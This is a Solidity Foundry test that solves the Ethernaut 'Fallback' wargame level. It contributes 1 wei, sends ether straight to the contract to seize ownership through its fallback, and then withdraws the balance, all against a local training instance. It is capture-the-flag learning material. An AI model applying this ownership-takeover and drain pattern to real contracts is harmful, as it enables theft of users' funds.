pragma solidity ^0.8.10;

// dependencies
import "@std/Test.sol";

// contracts
import "../src/Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";

contract FallbackTest is Test {
    address alice = address(0x1337);

    Ethernaut ethernaut;
    Fallback ethernautFallback;

    function setUp() public {
        vm.label(alice, "Alice");
        vm.label(address(this), "FallbackTest");
        vm.startPrank(alice);

        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        ethernautFallback = Fallback(payable(levelAddress));

        vm.label(address(ethernautFallback), "EthernautFallback");
        vm.deal(alice, 5 ether);
    }

    function testExploit() public {
        ethernautFallback.contribute{value: 1 wei}();   
        address(ethernautFallback).call{value: 1 ether}("");

        assertEq(ethernautFallback.owner(), alice);

        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(ethernautFallback));

        vm.stopPrank();

        assert(levelSuccessfullyPassed);
    }

}